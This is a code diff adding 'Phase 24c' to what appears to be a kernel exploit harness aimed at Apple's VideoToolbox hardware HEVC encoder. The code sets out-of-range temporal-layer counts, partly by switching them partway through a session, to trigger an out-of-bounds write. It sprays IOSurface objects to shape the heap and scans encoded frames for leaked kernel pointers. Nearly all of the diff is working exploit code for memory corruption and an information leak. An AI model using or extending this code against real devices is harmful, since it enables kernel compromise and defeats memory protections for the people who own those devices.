@@ -26553,7 +26553,420 @@ new_modes:
             rlog("\n--- Phase 24b complete ---\n");
         }
 
+        /* ============================================================
+         * Phase 24c: Multi-frame OOB encode — leak via temporal refs
+         *
+         * Single-frame encode with TL>8 produces NAL=0 (no output).
+         * But multi-frame encoding with moderate TL might produce
+         * output on Frame 1+ where the temporal layer config controls
+         * inter-frame references. If the corrupted config causes
+         * Frame 1 to reference wrong memory, the encoded bitstream
+         * may contain leaked kernel heap data.
+         *
+         * Also: Frame 0 output at TL=1 is 618 bytes. We encode
+         * Frame 0 FIRST (which produces output), then immediately
+         * re-encode with a large TL to trigger the OOB write, then
+         * encode Frame 1 to see if its output contains leaked data.
+         * ============================================================ */
+        if (rounds == 222 || rounds == 229) {
+            rlog("\n=== Phase 24c: Multi-frame OOB temporal ref leak ===\n");
 
+            /* 24c-A: Two-frame encode at moderate TL values.
+             * Frame 0 may output normally, Frame 1 uses temporal
+             * layer config that overflows. */
+            rlog("\n--- 24c-A: Two-frame encode with OOB TL ---\n");
+            {
+                int p24c_tl_vals[] = {9, 10, 16, 32};
+                int p24c_ntl = sizeof(p24c_tl_vals)/sizeof(p24c_tl_vals[0]);
+
+                for (int tli = 0; tli < p24c_ntl; tli++) {
+                    int tl = p24c_tl_vals[tli];
+                    rlog("  --- TL=%d two-frame ---\n", tl);
+
+                    VTCompressionSessionRef s = NULL;
+                    CFMutableDictionaryRef es = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(es,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                        kCFBooleanTrue);
+                    OSStatus cr = VTCompressionSessionCreate(
+                        kCFAllocatorDefault, 1920, 1080,
+                        kCMVideoCodecType_HEVC, es, NULL, NULL,
+                        encode_cb, NULL, &s);
+                    CFRelease(es);
+                    if (cr != noErr || !s) {
+                        rlog("    Session fail: %d\n", (int)cr);
+                        continue;
+                    }
+
+                    CFNumberRef tln = CFNumberCreate(NULL,
+                        kCFNumberIntType, &tl);
+                    VTSessionSetProperty(s,
+                        CFSTR("NumberOfTemporalLayers"), tln);
+                    CFRelease(tln);
+                    VTSessionSetProperty(s,
+                        CFSTR("RealTime"), kCFBooleanTrue);
+                    VTSessionSetProperty(s,
+                        CFSTR("AllowTemporalCompression"),
+                        kCFBooleanTrue);
+                    VTCompressionSessionPrepareToEncodeFrames(s);
+
+                    /* Encode Frame 0 */
+                    g_encode_done = 0; g_cb_status = -999;
+                    g_last_nal_size = 0; g_saved_nal_len = 0;
+                    g_last_pset_count = 0;
+                    encode_one(s, 0, 1920, 1080);
+                    for (int w = 0; w < 300 && !g_encode_done; w++)
+                        usleep(10000);
+                    rlog("    F0: cb=%d NAL=%zu psets=%zu",
+                        (int)g_cb_status, (size_t)g_last_nal_size,
+                        (size_t)g_last_pset_count);
+
+                    /* Scan Frame 0 NAL for KPTR */
+                    int f0_kptr = 0;
+                    size_t f0_len = g_saved_nal_len;
+                    if (f0_len > 4096) f0_len = 4096;
+                    for (size_t qi = 0; qi + 7 < f0_len; qi++) {
+                        uint64_t qv;
+                        memcpy(&qv, g_saved_nal + qi, 8);
+                        if ((qv >> 40) == 0xFFFFFE) f0_kptr++;
+                    }
+                    if (f0_kptr) rlog(" *** %d KPTR ***", f0_kptr);
+                    rlog("\n");
+
+                    /* Encode Frame 1 — this uses temporal layer config
+                     * which may reference Frame 0 through corrupted
+                     * temporal layer settings */
+                    g_encode_done = 0; g_cb_status = -999;
+                    g_last_nal_size = 0; g_saved_nal_len = 0;
+                    g_last_pset_count = 0;
+                    encode_one(s, 1, 1920, 1080);
+                    for (int w = 0; w < 500 && !g_encode_done; w++)
+                        usleep(10000);
+                    rlog("    F1: cb=%d NAL=%zu psets=%zu",
+                        (int)g_cb_status, (size_t)g_last_nal_size,
+                        (size_t)g_last_pset_count);
+
+                    /* Scan Frame 1 NAL for KPTR */
+                    int f1_kptr = 0;
+                    size_t f1_len = g_saved_nal_len;
+                    if (f1_len > 4096) f1_len = 4096;
+                    for (size_t qi = 0; qi + 7 < f1_len; qi++) {
+                        uint64_t qv;
+                        memcpy(&qv, g_saved_nal + qi, 8);
+                        if ((qv >> 40) == 0xFFFFFE) f1_kptr++;
+                    }
+                    if (f1_kptr) rlog(" *** %d KPTR ***", f1_kptr);
+                    rlog("\n");
+
+                    /* If Frame 1 output is different size from baseline
+                     * (618), that's interesting */
+                    if (g_last_nal_size > 0 && g_last_nal_size != 618)
+                        rlog("    *** F1 SIZE ANOMALY: %zu ***\n",
+                            (size_t)g_last_nal_size);
+
+                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                    VTCompressionSessionInvalidate(s);
+                    CFRelease(s);
+                    usleep(50000);
+                }
+            }
+
+            /* 24c-B: Encode F0 at TL=1 (outputs data), then change
+             * TL mid-session to large value and encode F1.
+             * The session config change triggers the OOB realloc. */
+            rlog("\n--- 24c-B: Mid-session TL switch ---\n");
+            {
+                VTCompressionSessionRef s = NULL;
+                CFMutableDictionaryRef es = CFDictionaryCreateMutable(
+                    kCFAllocatorDefault, 0,
+                    &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(es,
+                    CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                    kCFBooleanTrue);
+                VTCompressionSessionCreate(
+                    kCFAllocatorDefault, 1920, 1080,
+                    kCMVideoCodecType_HEVC, es, NULL, NULL,
+                    encode_cb, NULL, &s);
+                CFRelease(es);
+
+                if (s) {
+                    /* Start with TL=1 (normal) */
+                    int tl1 = 1;
+                    CFNumberRef tln1 = CFNumberCreate(NULL,
+                        kCFNumberIntType, &tl1);
+                    VTSessionSetProperty(s,
+                        CFSTR("NumberOfTemporalLayers"), tln1);
+                    CFRelease(tln1);
+                    VTSessionSetProperty(s,
+                        CFSTR("RealTime"), kCFBooleanTrue);
+                    VTSessionSetProperty(s,
+                        CFSTR("AllowTemporalCompression"),
+                        kCFBooleanTrue);
+                    VTCompressionSessionPrepareToEncodeFrames(s);
+
+                    /* Encode Frame 0 at TL=1 */
+                    g_encode_done = 0; g_cb_status = -999;
+                    g_last_nal_size = 0; g_saved_nal_len = 0;
+                    encode_one(s, 0, 1920, 1080);
+                    for (int w = 0; w < 300 && !g_encode_done; w++)
+                        usleep(10000);
+                    rlog("  F0 (TL=1): cb=%d NAL=%zu\n",
+                        (int)g_cb_status, (size_t)g_last_nal_size);
+                    uint8_t f0_first16[16];
+                    size_t f0_cp = g_saved_nal_len;
+                    if (f0_cp > 16) f0_cp = 16;
+                    memcpy(f0_first16, g_saved_nal, f0_cp);
+
+                    /* Now switch to TL=64 mid-session (triggers OOB) */
+                    int tl64 = 64;
+                    CFNumberRef tln64 = CFNumberCreate(NULL,
+                        kCFNumberIntType, &tl64);
+                    OSStatus sp = VTSessionSetProperty(s,
+                        CFSTR("NumberOfTemporalLayers"), tln64);
+                    CFRelease(tln64);
+                    rlog("  Mid-session TL switch to 64: %d\n", (int)sp);
+
+                    /* Encode Frame 1 with new TL config */
+                    g_encode_done = 0; g_cb_status = -999;
+                    g_last_nal_size = 0; g_saved_nal_len = 0;
+                    g_last_pset_count = 0;
+                    encode_one(s, 1, 1920, 1080);
+                    for (int w = 0; w < 500 && !g_encode_done; w++)
+                        usleep(10000);
+                    rlog("  F1 (TL=64): cb=%d NAL=%zu psets=%zu",
+                        (int)g_cb_status, (size_t)g_last_nal_size,
+                        (size_t)g_last_pset_count);
+
+                    /* Scan for KPTR */
+                    int kptr = 0;
+                    size_t cp = g_saved_nal_len;
+                    if (cp > 4096) cp = 4096;
+                    for (size_t qi = 0; qi + 7 < cp; qi++) {
+                        uint64_t qv;
+                        memcpy(&qv, g_saved_nal + qi, 8);
+                        if ((qv >> 40) == 0xFFFFFE) kptr++;
+                    }
+                    if (kptr) rlog(" *** %d KPTR ***", kptr);
+                    rlog("\n");
+
+                    /* Try Frame 2 as well */
+                    g_encode_done = 0; g_cb_status = -999;
+                    g_last_nal_size = 0; g_saved_nal_len = 0;
+                    encode_one(s, 2, 1920, 1080);
+                    for (int w = 0; w < 500 && !g_encode_done; w++)
+                        usleep(10000);
+                    rlog("  F2 (TL=64): cb=%d NAL=%zu",
+                        (int)g_cb_status, (size_t)g_last_nal_size);
+                    kptr = 0;
+                    cp = g_saved_nal_len;
+                    if (cp > 4096) cp = 4096;
+                    for (size_t qi = 0; qi + 7 < cp; qi++) {
+                        uint64_t qv;
+                        memcpy(&qv, g_saved_nal + qi, 8);
+                        if ((qv >> 40) == 0xFFFFFE) kptr++;
+                    }
+                    if (kptr) rlog(" *** %d KPTR ***", kptr);
+                    rlog("\n");
+
+                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                    VTCompressionSessionInvalidate(s);
+                    CFRelease(s);
+                }
+            }
+
+            /* 24c-C: Decode the OOB-encoded output — if the hardware
+             * encoder wrote corrupted HEVC data, the decoder might
+             * expose it differently when parsing the bitstream */
+            rlog("\n--- 24c-C: Decode round-trip analysis ---\n");
+            {
+                /* Encode one frame with TL=1 to get valid baseline */
+                VTCompressionSessionRef enc = NULL;
+                CFMutableDictionaryRef es = CFDictionaryCreateMutable(
+                    kCFAllocatorDefault, 0,
+                    &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(es,
+                    CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                    kCFBooleanTrue);
+                VTCompressionSessionCreate(
+                    kCFAllocatorDefault, 1920, 1080,
+                    kCMVideoCodecType_HEVC, es, NULL, NULL,
+                    encode_cb, NULL, &enc);
+                CFRelease(es);
+
+                if (enc) {
+                    int tl1 = 1;
+                    CFNumberRef tln = CFNumberCreate(NULL,
+                        kCFNumberIntType, &tl1);
+                    VTSessionSetProperty(enc,
+                        CFSTR("NumberOfTemporalLayers"), tln);
+                    CFRelease(tln);
+                    VTSessionSetProperty(enc,
+                        CFSTR("RealTime"), kCFBooleanTrue);
+                    VTSessionSetProperty(enc,
+                        CFSTR("AllowTemporalCompression"),
+                        kCFBooleanTrue);
+                    VTCompressionSessionPrepareToEncodeFrames(enc);
+
+                    g_encode_done = 0; g_cb_status = -999;
+                    g_last_nal_size = 0; g_saved_nal_len = 0;
+                    encode_one(enc, 0, 1920, 1080);
+                    for (int w = 0; w < 300 && !g_encode_done; w++)
+                        usleep(10000);
+
+                    rlog("  Baseline encode: cb=%d NAL=%zu\n",
+                        (int)g_cb_status, (size_t)g_last_nal_size);
+
+                    /* Save baseline NAL bytes */
+                    uint8_t base_nal[4096];
+                    size_t base_len = g_saved_nal_len;
+                    if (base_len > 4096) base_len = 4096;
+                    memcpy(base_nal, g_saved_nal, base_len);
+                    size_t base_total = g_last_nal_size;
+
+                    VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
+                    VTCompressionSessionInvalidate(enc);
+                    CFRelease(enc);
+
+                    /* Now encode at TL=1 but with 128 IOSurface spray
+                     * objects surrounding it, then switch to TL=32
+                     * mid-session and encode another frame */
+                    rlog("  Spray + mid-session switch test...\n");
+
+                    /* Spray to fill heap around next VT session */
+                    IOSurfaceRef spray2[64];
+                    int spray2_ct = 0;
+                    for (int i = 0; i < 64; i++) {
+                        int sw = 32, sh = 32, sbpe = 4,
+                            spf = 0x42475241;
+                        CFNumberRef sw_n = CFNumberCreate(NULL,
+                            kCFNumberIntType, &sw);
+                        CFNumberRef sh_n = CFNumberCreate(NULL,
+                            kCFNumberIntType, &sh);
+                        CFNumberRef sbpe_n = CFNumberCreate(NULL,
+                            kCFNumberIntType, &sbpe);
+                        CFNumberRef spf_n = CFNumberCreate(NULL,
+                            kCFNumberIntType, &spf);
+                        CFStringRef sk[] = {
+                            CFSTR("IOSurfaceWidth"),
+                            CFSTR("IOSurfaceHeight"),
+                            CFSTR("IOSurfaceBytesPerElement"),
+                            CFSTR("IOSurfacePixelFormat")
+                        };
+                        CFTypeRef sv[] = { sw_n, sh_n, sbpe_n, spf_n };
+                        CFDictionaryRef sp = CFDictionaryCreate(NULL,
+                            (const void **)sk, (const void **)sv, 4,
+                            &kCFTypeDictionaryKeyCallBacks,
+                            &kCFTypeDictionaryValueCallBacks);
+                        spray2[i] = IOSurfaceCreate(sp);
+                        CFRelease(sp); CFRelease(sw_n); CFRelease(sh_n);
+                        CFRelease(sbpe_n); CFRelease(spf_n);
+                        if (spray2[i]) spray2_ct++;
+                    }
+
+                    VTCompressionSessionRef enc2 = NULL;
+                    es = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(es,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                        kCFBooleanTrue);
+                    VTCompressionSessionCreate(
+                        kCFAllocatorDefault, 1920, 1080,
+                        kCMVideoCodecType_HEVC, es, NULL, NULL,
+                        encode_cb, NULL, &enc2);
+                    CFRelease(es);
+
+                    if (enc2) {
+                        int tl1b = 1;
+                        CFNumberRef tln2 = CFNumberCreate(NULL,
+                            kCFNumberIntType, &tl1b);
+                        VTSessionSetProperty(enc2,
+                            CFSTR("NumberOfTemporalLayers"), tln2);
+                        CFRelease(tln2);
+                        VTSessionSetProperty(enc2,
+                            CFSTR("RealTime"), kCFBooleanTrue);
+                        VTSessionSetProperty(enc2,
+                            CFSTR("AllowTemporalCompression"),
+                            kCFBooleanTrue);
+                        VTCompressionSessionPrepareToEncodeFrames(enc2);
+
+                        /* F0 at TL=1 */
+                        g_encode_done = 0; g_cb_status = -999;
+                        g_last_nal_size = 0; g_saved_nal_len = 0;
+                        encode_one(enc2, 0, 1920, 1080);
+                        for (int w = 0; w < 300 && !g_encode_done; w++)
+                            usleep(10000);
+                        rlog("  F0 (spray+TL=1): cb=%d NAL=%zu\n",
+                            (int)g_cb_status, (size_t)g_last_nal_size);
+
+                        /* Compare with baseline */
+                        int ndiff = 0;
+                        size_t cmp = g_saved_nal_len;
+                        if (cmp > base_len) cmp = base_len;
+                        for (size_t d = 0; d < cmp; d++) {
+                            if (g_saved_nal[d] != base_nal[d]) ndiff++;
+                        }
+                        rlog("  NAL diff from baseline: %d bytes"
+                             " (of %zu compared)\n", ndiff, cmp);
+
+                        /* Switch to TL=32 and encode F1 */
+                        int tl32 = 32;
+                        CFNumberRef tln32 = CFNumberCreate(NULL,
+                            kCFNumberIntType, &tl32);
+                        VTSessionSetProperty(enc2,
+                            CFSTR("NumberOfTemporalLayers"), tln32);
+                        CFRelease(tln32);
+
+                        g_encode_done = 0; g_cb_status = -999;
+                        g_last_nal_size = 0; g_saved_nal_len = 0;
+                        encode_one(enc2, 1, 1920, 1080);
+                        for (int w = 0; w < 500 && !g_encode_done; w++)
+                            usleep(10000);
+                        rlog("  F1 (spray+TL=32): cb=%d NAL=%zu",
+                            (int)g_cb_status, (size_t)g_last_nal_size);
+
+                        int kptr = 0;
+                        size_t cp = g_saved_nal_len;
+                        if (cp > 4096) cp = 4096;
+                        for (size_t qi = 0; qi + 7 < cp; qi++) {
+                            uint64_t qv;
+                            memcpy(&qv, g_saved_nal + qi, 8);
+                            if ((qv >> 40) == 0xFFFFFE) kptr++;
+                        }
+                        if (kptr) rlog(" *** %d KPTR ***", kptr);
+                        rlog("\n");
+
+                        /* Dump first 64 bytes of F1 output for analysis */
+                        if (g_saved_nal_len > 0) {
+                            rlog("  F1 first 64 bytes: ");
+                            size_t dmp = g_saved_nal_len;
+                            if (dmp > 64) dmp = 64;
+                            for (size_t j = 0; j < dmp; j++)
+                                rlog("%02x", g_saved_nal[j]);
+                            rlog("\n");
+                        }
+
+                        VTCompressionSessionCompleteFrames(enc2,
+                            kCMTimeInvalid);
+                        VTCompressionSessionInvalidate(enc2);
+                        CFRelease(enc2);
+                    }
+
+                    /* Cleanup spray */
+                    for (int i = 0; i < 64; i++) {
+                        if (spray2[i]) CFRelease(spray2[i]);
+                    }
+                }
+            }
+
+            rlog("\n--- Phase 24c complete ---\n");
+        }
 
 
         /*
